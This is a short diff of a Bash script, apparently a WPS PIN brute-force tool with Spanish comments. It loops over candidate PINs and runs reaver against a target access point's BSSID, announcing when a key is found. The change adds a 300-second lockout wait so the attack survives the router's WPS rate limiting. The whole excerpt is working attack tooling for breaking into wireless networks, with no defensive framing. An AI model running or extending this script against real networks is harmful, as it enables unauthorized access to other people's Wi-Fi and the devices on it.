@@ -7,6 +7,7 @@ BSSID=$1
 CHANN=$2
 MON_IFACE=$3
 PAUSA=$4
+WAIT_LOCK=300
 SAVE_FILE="/tmp/$BSSID"
 NUM_PARAM="$#"
 
@@ -59,7 +60,7 @@ attack() {
 		do
 			echo -e "\nProbando PIN: [ $PIN_CONT / $NUM_PINS ]\t$i"
 			PIN=$(echo $i | cut -c 1,2,3,4,5,6,7,8)					#Este filtrado es necesario debido a que reaver incluye comillas simples ('') al inicio y final de cada pin
-			reaver -vv -i $MON_IFACE -c $CHANN -f -b $BSSID -g 1 -d 10 -p $PIN
+			reaver -vv -i $MON_IFACE -c $CHANN -f -b $BSSID -g 1 -d 10 -l $WAIT_LOCK -p $PIN
 			if [ "$?" == "0" ]
 				then
 					echo -e "\n * K E Y   F O U N D *\n"
